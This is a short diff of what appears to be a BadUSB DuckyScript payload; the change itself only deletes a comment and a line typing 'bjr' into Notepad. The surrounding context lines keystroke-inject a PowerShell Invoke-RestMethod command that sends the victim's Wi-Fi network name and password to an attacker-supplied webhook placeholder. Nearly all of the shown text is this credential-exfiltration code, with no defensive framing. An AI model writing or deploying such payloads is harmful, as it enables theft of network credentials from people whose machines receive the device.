@@ -17,7 +17,3 @@ DELAY 500
 STRING Invoke-RestMethod -Uri "YOUR WEBHOOK HERE" -Method Post -ContentType "application/json" -Body (ConvertTo-Json -InputObject @{ content = "SSID: $profileName`nPassword: $wifiPassword" })
 ENTER
 DELAY 500
-
-REM Écrire "bjr" dans Notepad
-STRING bjr
-
